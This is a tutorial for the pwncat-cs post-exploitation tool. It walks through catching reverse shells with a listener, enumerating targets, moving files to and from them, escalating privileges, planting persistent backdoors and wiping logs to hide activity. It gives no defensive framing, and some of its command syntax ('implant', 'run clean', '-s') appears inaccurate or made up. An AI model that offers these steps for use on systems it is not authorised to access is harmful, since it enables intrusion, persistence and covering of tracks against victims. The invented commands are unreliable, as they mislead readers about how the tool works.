# Pwncat-cs

### Step 1: Installation

#### Prerequisites
- Python 3.6+ installed on your system.

#### Installation Steps
1. Open your terminal.
2. Install pwncat-cs using pip:

    ```bash
    pip install pwncat-cs
    ```

### Step 2: Basic Usage

#### Starting a Listener
pwncat-cs can act as a listener to receive connections from a target machine.

1. Start pwncat-cs in listening mode on a specific port:

    ```bash
    pwncat-cs -lp 4444
    ```

    Here, `-l` indicates listening mode and `-p` specifies the port number.

#### Connecting to a Remote Host
To connect to a remote host that is already listening, use the following command:

1. Connect to the target machine:

    ```bash
    pwncat-cs target_ip:4444
    ```

    Replace `target_ip` with the actual IP address of the target machine and `4444` with the port number.

### Step 3: Post-Exploitation

Once you have a shell on the target machine, you can use various pwncat-cs features for post-exploitation tasks.

#### Interacting with the Target
After successfully connecting, you'll get an interactive shell. You can use standard shell commands to interact with the target system.

#### Enumerating the System
pwncat-cs provides built-in enumeration capabilities.

1. Run an enumeration command:

    ```bash
    run enumerate
    ```

    This command will gather information about the target system, including users, groups, network information, and more.

#### Uploading Files
To upload files from your local machine to the target:

1. Use the `upload` command:

    ```bash
    upload /path/to/local/file /path/to/remote/destination
    ```

    Replace `/path/to/local/file` with the path to the file on your local machine and `/path/to/remote/destination` with the desired path on the target machine.

#### Downloading Files
To download files from the target to your local machine:

1. Use the `download` command:

    ```bash
    download /path/to/remote/file /path/to/local/destination
    ```

    Replace `/path/to/remote/file` with the path to the file on the target machine and `/path/to/local/destination` with the desired path on your local machine.

### Step 4: Privilege Escalation

pwncat-cs can help identify and exploit potential privilege escalation vectors.

#### Checking for Privilege Escalation
1. Run the `enumerate` command to gather information.
2. Analyze the results to identify potential vectors for privilege escalation.

#### Exploiting Privilege Escalation
1. Use built-in modules or scripts to exploit identified vectors. For example:

    ```bash
    run escalate
    ```

    This command will attempt various privilege escalation techniques based on the system's vulnerabilities.

### Step 5: Maintaining Access

#### Creating Persistent Backdoors
1. Use the `implant` command to create a persistent backdoor:

    ```bash
    implant /path/to/backdoor
    ```

    Replace `/path/to/backdoor` with the path to your backdoor script or binary.

#### Removing Traces
1. Use the `clean` command to remove traces of your activities:

    ```bash
    run clean
    ```

    This command will attempt to remove logs and other traces from the target system.

### Step 6: Advanced Features

#### Scripting with pwncat-cs
pwncat-cs supports scripting for automation.

1. Write a script to automate tasks.
2. Execute the script using pwncat-cs:

    ```bash
    pwncat-cs -s /path/to/script.py
    ```

    Replace `/path/to/script.py` with the path to your script.
